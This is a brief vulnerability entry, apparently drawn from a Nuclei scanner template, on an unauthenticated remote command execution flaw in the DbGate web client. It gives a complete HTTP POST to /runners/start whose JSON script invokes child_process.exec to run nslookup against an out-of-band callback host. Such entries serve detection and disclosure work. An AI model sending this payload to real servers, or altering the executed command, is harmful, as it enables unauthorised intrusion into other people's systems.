# Vulnerability: DbGate Web Client - Unauthenticated Remote Command Execution
**Classification:** CWE-78,CWE-94
**Source:** Nuclei Template (`dbgate-unauth-rce.yaml`)

## Description
DbGate Web Client Management is suspectible to an unauthenticated remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /runners/start HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"script":"process.mainModule.require('child_process').exec('nslookup {{interactsh-url}}')"}
```

